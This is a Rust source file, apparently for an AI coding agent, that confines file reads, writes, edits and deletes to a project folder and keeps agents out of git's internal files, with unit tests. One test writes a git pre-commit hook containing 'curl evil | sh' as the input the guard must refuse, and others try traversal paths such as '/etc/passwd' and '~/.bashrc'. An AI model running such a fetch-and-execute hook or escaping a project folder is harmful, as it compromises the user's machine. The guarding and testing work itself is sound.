//! Files inside a working folder, the way a careful engineer edits them.

use crate::blocks::edit_pairs;
use std::fs;
use std::io::Read;
use std::path::{Component, Path, PathBuf};

pub const MAX_FILE_BYTES: usize = 2 << 20;

#[derive(Debug, Clone, PartialEq, thiserror::Error)]
pub enum FsError {
    #[error("{0}")]
    Refused(String),
    #[error("{0}")]
    Failed(String),
}

/// Resolve `rel` inside `root`. Absolute paths are accepted only when they
/// already point inside the folder; `..`, `~` elsewhere, backslashes and
/// symlinks that lead out are refused (never quietly rewritten).
pub fn safe(root: &Path, rel: &str) -> Result<PathBuf, FsError> {
    let rel = rel.trim();
    if rel.is_empty() {
        return Err(FsError::Refused("no filename given".into()));
    }
    let base = root.canonicalize().map_err(|e| FsError::Failed(format!("no such folder {}: {e}", root.display())))?;
    let rel_owned: String;
    let rel = if rel.starts_with('/') || rel.starts_with('~') {
        let home = std::env::var("HOME").unwrap_or_default();
        let abs = if let Some(r) = rel.strip_prefix('~') { format!("{home}{r}") } else { rel.to_string() };
        let abs = PathBuf::from(abs);
        let resolved = resolve_existing(&abs);
        match resolved.strip_prefix(&base) {
            Ok(r) => {
                // the project folder itself, by its full path: "."
                rel_owned = if r.as_os_str().is_empty() { ".".into() } else { r.to_string_lossy().into_owned() };
                rel_owned.as_str()
            }
            _ => return Err(FsError::Refused(format!("give a path inside the project ({}), not {rel:?}",
                                                     base.display()))),
        }
    } else {
        rel
    };
    if rel.contains('\\') {
        return Err(FsError::Refused("use forward slashes".into()));
    }
    // `.` is here (`read .`, `./src/x`); `..` and its look-alikes never are
    for part in rel.split('/').filter(|p| !p.is_empty() && *p != ".") {
        if part.chars().all(|c| c == '.') || part.starts_with("..") || part.contains('\0') {
            return Err(FsError::Refused(format!("path segment not allowed: {part:?}")));
        }
    }
    let p = resolve_existing(&base.join(rel));
    if p != base && !p.starts_with(&base) {
        return Err(FsError::Refused(format!("path escapes the project: {rel}")));
    }
    Ok(p)
}

/// Canonicalize the longest existing prefix (so a symlink in the middle is
/// followed), then append the rest.
fn resolve_existing(p: &Path) -> PathBuf {
    let mut existing = p.to_path_buf();
    let mut tail: Vec<std::ffi::OsString> = Vec::new();
    loop {
        if let Ok(c) = existing.canonicalize() {
            let mut out = c;
            for t in tail.iter().rev() {
                out.push(t);
            }
            return normalize(&out);
        }
        match (existing.file_name().map(|s| s.to_os_string()), existing.parent()) {
            (Some(name), Some(parent)) => {
                tail.push(name);
                existing = parent.to_path_buf();
            }
            _ => return normalize(p),
        }
    }
}

fn normalize(p: &Path) -> PathBuf {
    let mut out = PathBuf::new();
    for c in p.components() {
        match c {
            Component::ParentDir => {
                out.pop();
            }
            Component::CurDir => {}
            other => out.push(other),
        }
    }
    out
}

/// Where an agent may write: inside the project, and never into git's own
/// files (a hook written there runs the next time you commit).
fn writable(root: &Path, rel: &str) -> Result<PathBuf, FsError> {
    let p = safe(root, rel)?;
    let base = root.canonicalize().unwrap_or_else(|_| root.to_path_buf());
    let inside = p.strip_prefix(&base).unwrap_or(&p);
    if inside.components().any(|c| c.as_os_str() == ".git") {
        return Err(FsError::Refused("git's own files (.git/: hooks, config) aren't edited directly — use git \
            commands".into()));
    }
    Ok(p)
}

/// Replace a file's contents all at once: a crash midway leaves the old
/// version, never half of the new one. The mode is kept.
fn write_atomic(p: &Path, data: &[u8]) -> std::io::Result<()> {
    let name = p.file_name().map(|n| n.to_string_lossy().into_owned()).unwrap_or_default();
    let tmp = p.with_file_name(format!(".{name}.chuck-{}", std::process::id()));
    let perm = fs::metadata(p).ok().map(|m| m.permissions());
    let r = fs::write(&tmp, data).and_then(|_| {
        if let Some(perm) = perm {
            fs::set_permissions(&tmp, perm)?;
        }
        fs::rename(&tmp, p)
    });
    if r.is_err() {
        let _ = fs::remove_file(&tmp);
    }
    r
}

pub fn read_keep(p: &Path) -> std::io::Result<String> {
    let mut s = String::new();
    fs::File::open(p)?.read_to_string(&mut s)?;
    Ok(s)
}

/// "\r\n" when every line of the file ends in CRLF.
pub fn eol_of(text: &str) -> &'static str {
    let n = text.matches('\n').count();
    if n > 0 && text.matches("\r\n").count() == n { "\r\n" } else { "\n" }
}

fn with_eol(text: &str, eol: &str) -> String {
    if eol == "\n" { text.to_string() } else { text.replace("\r\n", "\n").replace('\n', eol) }
}

/// Before/after of one change, for the diff, the checkpoint and the evidence.
#[derive(Clone, Debug, PartialEq)]
pub struct Change {
    pub rel: String,
    pub path: PathBuf,
    pub before: Option<String>,
    pub after: Option<String>,
}

impl Change {
    pub fn diff(&self) -> (String, usize, usize) {
        unified(&self.rel, self.before.as_deref(), self.after.as_deref())
    }
}

/// Write a whole file. A Windows file stays a Windows file; a script is made
/// executable.
pub fn write_file(root: &Path, rel: &str, content: &str) -> Result<Change, FsError> {
    let p = writable(root, rel)?;
    if p.is_dir() {
        return Err(FsError::Refused(format!("{rel} is a folder")));
    }
    if content.len() > MAX_FILE_BYTES {
        return Err(FsError::Refused("file too large (2 MB cap)".into()));
    }
    let before = if p.is_file() { read_keep(&p).ok() } else { None };
    let mut data = content.to_string();
    if !data.contains('\r') {
        if let Some(b) = &before {
            data = with_eol(&data, eol_of(b));
        }
    }
    if let Some(parent) = p.parent() {
        fs::create_dir_all(parent).map_err(|e| FsError::Failed(format!("couldn't write {rel}: {e}")))?;
    }
    write_atomic(&p, data.as_bytes()).map_err(|e| FsError::Failed(format!("couldn't write {rel}: {e}")))?;
    if p.extension().is_some_and(|e| e == "sh") || data.starts_with("#!") {
        use std::os::unix::fs::PermissionsExt;
        if let Ok(m) = fs::metadata(&p) {
            let mut perm = m.permissions();
            perm.set_mode(perm.mode() | 0o755);
            let _ = fs::set_permissions(&p, perm);
        }
    }
    Ok(Change { rel: rel_of(root, &p), path: p, before, after: Some(data) })
}

/// Add to the end of a file (created when missing): a big file written in
/// parts. The file's own line endings are kept.
pub fn append_file(root: &Path, rel: &str, content: &str) -> Result<Change, FsError> {
    let p = writable(root, rel)?;
    if p.is_dir() {
        return Err(FsError::Refused(format!("{rel} is a folder")));
    }
    let before = if p.is_file() {
        Some(read_keep(&p).map_err(|e| FsError::Failed(format!("couldn't read {rel}: {e}")))?)
    } else {
        None
    };
    let mut whole = before.clone().unwrap_or_default();
    // the part goes on a line of its own
    if !whole.is_empty() && !whole.ends_with('\n') {
        whole.push_str(eol_of(&whole));
    }
    whole.push_str(content);
    let mut ch = write_file(root, rel, &whole)?;
    ch.before = before;
    Ok(ch)
}

fn rel_of(root: &Path, p: &Path) -> String {
    let base = root.canonicalize().unwrap_or_else(|_| root.to_path_buf());
    p.strip_prefix(&base).map(|r| r.to_string_lossy().into_owned()).unwrap_or_else(|_| p.display().to_string())
}

/// Locate `needle` ignoring trailing whitespace on each line, only when the
/// match is unique.
fn loose_find(hay: &str, needle: &str) -> Option<(usize, usize)> {
    let hl: Vec<&str> = hay.split('\n').collect();
    let nl: Vec<&str> = needle.split('\n').map(str::trim_end).collect();
    if nl.len() > hl.len() {
        return None;
    }
    let mut hit = None;
    for i in 0..=hl.len() - nl.len() {
        if hl[i..i + nl.len()].iter().map(|l| l.trim_end()).eq(nl.iter().copied()) {
            if hit.is_some() {
                return None;
            }
            hit = Some(i);
        }
    }
    let i = hit?;
    let start: usize = hl[..i].iter().map(|l| l.len() + 1).sum();
    let end = start + hl[i..i + nl.len()].join("\n").len();
    Some((start, end))
}

/// SEARCH text copied from a `read` page keeps its line numbers ("  229  if
/// (x) {"): without them, when every line has one.
fn without_line_numbers(search: &str) -> Option<String> {
    static RX: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    let rx = RX.get_or_init(|| regex::Regex::new(r"^\s*\d+  ").expect("valid regex"));
    let lines: Vec<&str> = search.split('\n').collect();
    if !lines.iter().filter(|l| !l.trim().is_empty()).all(|l| rx.is_match(l)) {
        return None;
    }
    Some(lines.iter().map(|l| rx.replace(l, "").into_owned()).collect::<Vec<_>>().join("\n"))
}

/// Where in `text` the SEARCH was most likely meant: the lines around the
/// best match of its first line, exactly as the file has them.
fn nearest(text: &str, search: &str) -> Option<String> {
    let want = search.lines().map(str::trim).find(|l| l.len() >= 3)?;
    let lines: Vec<&str> = text.lines().collect();
    let score = |l: &str| {
        let l = l.trim();
        if l == want { return usize::MAX; }
        // words in common, then a shared start
        let words = want.split(|c: char| !c.is_alphanumeric() && c != '_').filter(|w| w.len() > 1)
            .filter(|w| l.contains(*w)).count();
        words * 100 + l.chars().zip(want.chars()).take_while(|(a, b)| a == b).count()
    };
    let (i, best) = lines.iter().enumerate().map(|(i, l)| (i, score(l))).max_by_key(|(_, s)| *s)?;
    if best < 100 {
        return None;
    }
    let n = search.lines().count().max(1);
    let (a, b) = (i.saturating_sub(2), (i + n + 2).min(lines.len()));
    Some(format!("near line {}:\n{}", i + 1, lines[a..b].join("\n")))
}

/// Apply SEARCH/REPLACE blocks: all or nothing. An empty SEARCH on a file
/// that doesn't exist creates it.
pub fn edit_file(root: &Path, rel: &str, body: &str) -> Result<Change, FsError> {
    let p = writable(root, rel)?;
    let blocks = edit_pairs(body);
    if blocks.is_empty() {
        return Err(FsError::Refused("no SEARCH/REPLACE block found — use <<<<<<< SEARCH / ======= / >>>>>>> REPLACE".into()));
    }
    if !p.exists() {
        if blocks.len() == 1 && blocks[0].0.trim().is_empty() {
            return write_file(root, rel, &format!("{}\n", blocks[0].1));
        }
        return Err(FsError::Refused(format!("no such file: {rel} (read it first, or write it)")));
    }
    let raw = read_keep(&p).map_err(|e| FsError::Failed(format!("couldn't read {rel}: {e}")))?;
    let eol = eol_of(&raw);
    let mut text = if eol == "\r\n" { raw.replace("\r\n", "\n") } else { raw.clone() };
    for (n, (search, repl)) in blocks.iter().enumerate() {
        let n = n + 1;
        if search.trim().is_empty() {
            return Err(FsError::Refused(format!("block {n}: empty SEARCH on an existing file")));
        }
        // quoted from a read page with its line numbers: the lines without them
        let unnumbered = if text.contains(search.as_str()) { None } else { without_line_numbers(search) };
        let search = unnumbered.as_ref().unwrap_or(search);
        match text.matches(search.as_str()).count() {
            1 => text = text.replacen(search.as_str(), repl, 1),
            0 => match loose_find(&text, search) {
                Some((a, b)) => text = format!("{}{}{}", &text[..a], repl, &text[b..]),
                None => return Err(FsError::Refused(match nearest(&text, search) {
                    Some(near) => format!("block {n}: SEARCH text not found in {rel}. The file has, {near}\n\
                        (quote those lines exactly, without line numbers)"),
                    None => format!("block {n}: SEARCH text not found in {rel} — read the file and quote the current \
                        lines exactly"),
                })),
            },
            c => return Err(FsError::Refused(format!(
                "block {n}: SEARCH matches {c} places in {rel} — include more surrounding lines so it is unique"))),
        }
    }
    let data = with_eol(&text, eol);
    write_atomic(&p, data.as_bytes()).map_err(|e| FsError::Failed(format!("couldn't edit {rel}: {e}")))?;
    Ok(Change { rel: rel_of(root, &p), path: p, before: Some(raw), after: Some(data) })
}

pub fn delete_file(root: &Path, rel: &str) -> Result<Change, FsError> {
    let p = writable(root, rel)?;
    if p == root.canonicalize().unwrap_or_else(|_| root.to_path_buf()) {
        return Err(FsError::Refused("that's the whole project".into()));
    }
    let before = if p.is_file() { read_keep(&p).ok() } else { None };
    if p.is_dir() {
        fs::remove_dir_all(&p).map_err(|e| FsError::Failed(e.to_string()))?;
    } else if p.exists() || p.is_symlink() {
        fs::remove_file(&p).map_err(|e| FsError::Failed(e.to_string()))?;
    } else {
        return Err(FsError::Refused(format!("no such file: {rel}")));
    }
    Ok(Change { rel: rel_of(root, &p), path: p, before, after: None })
}

/// A page of a file: numbered lines `start..end` (1-based), at most `limit`
/// characters, ending with the exact call for the next page when cut.
/// `path`, `path:120`, `path:120-400`, and the other ways a range gets
/// written (`path:120:400`, `path:120,400`, `path#L120-L400`, `path 120-400`):
/// (path, first line, last line). A name that exists as written is a name.
pub fn page_spec<'a>(root: &Path, spec: &'a str) -> (&'a str, usize, Option<usize>) {
    static RX: std::sync::OnceLock<regex::Regex> = std::sync::OnceLock::new();
    let rx = RX.get_or_init(|| regex::Regex::new(
        r"^(.+?)(?::\s*|#L|\s+)(\d+)(?:\s*(?:-|:|,|\.\.)\s*L?(\d*))?$").expect("valid regex"));
    let spec = spec.trim();
    if root.join(spec).exists() {
        return (spec, 1, None);
    }
    match rx.captures(spec) {
        Some(c) => {
            let path = c.get(1).map_or(spec, |m| m.as_str().trim_end());
            let start = c[2].parse().unwrap_or(1usize).max(1);
            let end = c.get(3).and_then(|m| m.as_str().parse().ok()).filter(|e| *e >= start);
            (path, start, end)
        }
        None => (spec, 1, None),
    }
}

pub fn read_page(root: &Path, spec: &str, limit: usize) -> Result<String, FsError> {
    let (path, start, end) = page_spec(root, spec);
    let p = safe(root, path)?;
    let meta = fs::metadata(&p).map_err(|e| FsError::Failed(format!("{path}: {e}")))?;
    if meta.is_dir() {
        let mut names: Vec<String> = fs::read_dir(&p).map_err(|e| FsError::Failed(e.to_string()))?
            .flatten().map(|e| {
                let n = e.file_name().to_string_lossy().into_owned();
                if e.path().is_dir() { n + "/" } else { n }
            }).collect();
        names.sort();
        return Ok(format!("{path}/ — {} entries\n{}", names.len(), names.join("\n")));
    }
    if !meta.is_file() {
        return Err(FsError::Refused(format!("{path} isn't a regular file")));
    }
    let bytes = fs::read(&p).map_err(|e| FsError::Failed(e.to_string()))?;
    if bytes[..bytes.len().min(4096)].contains(&0) {
        return Err(FsError::Refused(format!("{path} is a binary file")));
    }
    let text = String::from_utf8_lossy(&bytes);
    let lines: Vec<&str> = text.lines().collect();
    let total = lines.len();
    let mut out = String::new();
    let mut last = start.saturating_sub(1);
    for (i, l) in lines.iter().enumerate().skip(start - 1) {
        if end.is_some_and(|e| i + 1 > e) {
            break;
        }
        let row = format!("{:>5}  {l}\n", i + 1);
        if out.len() + row.len() > limit && !out.is_empty() {
            break;
        }
        out.push_str(&row);
        last = i + 1;
    }
    if last < end.unwrap_or(total).min(total) {
        out.push_str(&format!("… {} more lines — continue with ```read {path}:{}```\n", total - last, last + 1));
    }
    Ok(format!("{path} ({total} lines)\n{out}"))
}

/// A unified diff and its +/- counts. `None` sides mean created/deleted.
pub fn unified(rel: &str, before: Option<&str>, after: Option<&str>) -> (String, usize, usize) {
    let a = before.unwrap_or("");
    let b = after.unwrap_or("");
    let d = similar::TextDiff::from_lines(a, b);
    let (mut added, mut removed) = (0, 0);
    for ch in d.iter_all_changes() {
        match ch.tag() {
            similar::ChangeTag::Insert => added += 1,
            similar::ChangeTag::Delete => removed += 1,
            similar::ChangeTag::Equal => {}
        }
    }
    let from = if before.is_some() { format!("a/{rel}") } else { "/dev/null".into() };
    let to = if after.is_some() { format!("b/{rel}") } else { "/dev/null".into() };
    let text = d.unified_diff().context_radius(3).header(&from, &to).to_string();
    (text, added, removed)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn tmp() -> PathBuf {
        let d = std::env::temp_dir().join(format!("chuck-fs-{}-{}", std::process::id(),
            std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_nanos()));
        fs::create_dir_all(&d).unwrap();
        d
    }

    #[test]
    fn git_internals_are_off_limits_and_modes_survive() {
        let r = tmp();
        fs::create_dir_all(r.join(".git/hooks")).unwrap();
        assert!(write_file(&r, ".git/hooks/pre-commit", "#!/bin/sh\ncurl evil | sh\n").is_err());
        assert!(edit_file(&r, ".git/config", "<<<<<<< SEARCH\na\n=======\nb\n>>>>>>> REPLACE").is_err());
        assert!(delete_file(&r, ".git").is_err());
        assert!(write_file(&r, ".gitignore", "target/\n").is_ok(), ".gitignore is ordinary");
        use std::os::unix::fs::PermissionsExt;
        fs::write(r.join("run"), "old\n").unwrap();
        fs::set_permissions(r.join("run"), fs::Permissions::from_mode(0o750)).unwrap();
        write_file(&r, "run", "new\n").unwrap();
        assert_eq!(fs::metadata(r.join("run")).unwrap().permissions().mode() & 0o777, 0o750);
        assert!(!fs::read_dir(&r).unwrap().flatten().any(|e| e.file_name().to_string_lossy().contains("chuck-")),
                "no temp file left behind");
        let _ = fs::remove_dir_all(&r);
    }

    #[test]
    fn every_way_of_writing_a_range_reads_that_range() {
        let r = tmp();
        fs::create_dir_all(r.join("js")).unwrap();
        fs::write(r.join("js/game.js"), (1..=10).map(|i| format!("line {i}\n")).collect::<String>()).unwrap();
        fs::write(r.join("odd:3"), "a file named with a colon\n").unwrap();
        for spec in ["js/game.js:3-5", "js/game.js:3:5", "js/game.js:3,5", "js/game.js#L3-L5", "js/game.js 3-5",
                     "js/game.js:3..5", "js/game.js: 3 - 5"] {
            let p = read_page(&r, spec, 4000).unwrap_or_else(|e| panic!("{spec}: {e:?}"));
            assert!(p.contains("line 3") && p.contains("line 5") && !p.contains("line 6") && !p.contains("line 2\n"),
                    "{spec}: {p}");
        }
        let one = read_page(&r, "js/game.js:1", 4000).unwrap();
        assert!(one.contains("line 1") && one.contains("line 10"), "from line 1 on");
        assert!(read_page(&r, "odd:3", 4000).unwrap().contains("a file named with a colon"), "a real name stays a name");
    }

    #[test]
    fn writes_stay_inside_the_folder() {
        let r = tmp();
        assert!(write_file(&r, "src/a.py", "x = 1\n").is_ok());
        for bad in ["../x", "/etc/passwd", "a/../../x", "..\\x", "~/.bashrc"] {
            assert!(write_file(&r, bad, "no").is_err(), "{bad}");
        }
        let inside = format!("{}/b.py", r.canonicalize().unwrap().display());
        assert!(write_file(&r, &inside, "ok\n").is_ok(), "an absolute path inside is fine");
        std::os::unix::fs::symlink("/etc", r.join("out")).unwrap();
        assert!(write_file(&r, "out/evil", "x").is_err(), "a link out is refused");
        // `.` is the folder: it can be listed and named on the way in, never deleted or escaped
        assert!(read_page(&r, ".", 4000).unwrap().contains("src/"));
        assert!(read_page(&r, &r.canonicalize().unwrap().display().to_string(), 4000).unwrap().contains("b.py"));
        assert!(read_page(&r, "./src/a.py", 4000).unwrap().contains("x = 1"));
        assert!(delete_file(&r, ".").is_err() && delete_file(&r, "./").is_err());
        assert!(write_file(&r, ".", "x").is_err());
        for bad in ["./../x", "./..", "...", "src/./../../x"] {
            assert!(safe(&r, bad).is_err(), "{bad}");
        }
    }

    #[test]
    fn edits_are_all_or_nothing_and_whitespace_tolerant() {
        let r = tmp();
        fs::write(r.join("a.py"), "def f():  \n    return 1\n").unwrap();
        let body = "<<<<<<< SEARCH\ndef f():\n    return 1\n=======\ndef f():\n    return 2\n>>>>>>> REPLACE";
        let ch = edit_file(&r, "a.py", body).unwrap();
        assert_eq!(ch.after.as_deref(), Some("def f():\n    return 2\n"));
        let bad = "<<<<<<< SEARCH\nreturn 2\n=======\nreturn 3\n>>>>>>> REPLACE\n<<<<<<< SEARCH\nnope\n=======\nx\n>>>>>>> REPLACE";
        assert!(edit_file(&r, "a.py", bad).is_err());
        assert_eq!(fs::read_to_string(r.join("a.py")).unwrap(), "def f():\n    return 2\n");
    }

    #[test]
    fn an_edit_quoted_with_line_numbers_applies_and_a_miss_shows_the_real_lines() {
        let r = tmp();
        fs::write(r.join("e.js"), "function clear() {\n  for (const row of full) {\n    rows.splice(row, 1);\n  }\n}\n").unwrap();
        let numbered = "<<<<<<< SEARCH\n    2    for (const row of full) {\n    3      rows.splice(row, 1);\n=======\n  \
            for (const row of full.sort()) {\n    rows.splice(row, 1);\n>>>>>>> REPLACE";
        let ch = edit_file(&r, "e.js", numbered).unwrap();
        assert!(ch.after.unwrap().contains("full.sort()"));
        let miss = "<<<<<<< SEARCH\n  for (let row of full.sort()) {\n=======\nx\n>>>>>>> REPLACE";
        let e = edit_file(&r, "e.js", miss).unwrap_err().to_string();
        assert!(e.contains("near line 2") && e.contains("  for (const row of full.sort()) {"), "{e}");
    }

    #[test]
    fn windows_files_stay_windows_files() {
        let r = tmp();
        fs::write(r.join("w.txt"), "a\r\nb\r\n").unwrap();
        write_file(&r, "w.txt", "a\nc\n").unwrap();
        assert_eq!(fs::read_to_string(r.join("w.txt")).unwrap(), "a\r\nc\r\n");
    }

    #[test]
    fn reads_in_pages() {
        let r = tmp();
        fs::write(r.join("big.txt"), (1..=500).map(|i| format!("line {i}\n")).collect::<String>()).unwrap();
        let p = read_page(&r, "big.txt", 400).unwrap();
        assert!(p.contains("    1  line 1") && p.contains("continue with ```read big.txt:"));
        let q = read_page(&r, "big.txt:499-500", 4000).unwrap();
        assert!(q.contains("  500  line 500") && !q.contains("more lines"));
    }

    #[test]
    fn diffs_count_lines() {
        let (d, a, rm) = unified("x.py", Some("a\nb\n"), Some("a\nc\nd\n"));
        assert_eq!((a, rm), (2, 1));
        assert!(d.contains("--- a/x.py") && d.contains("+c"));
    }
}
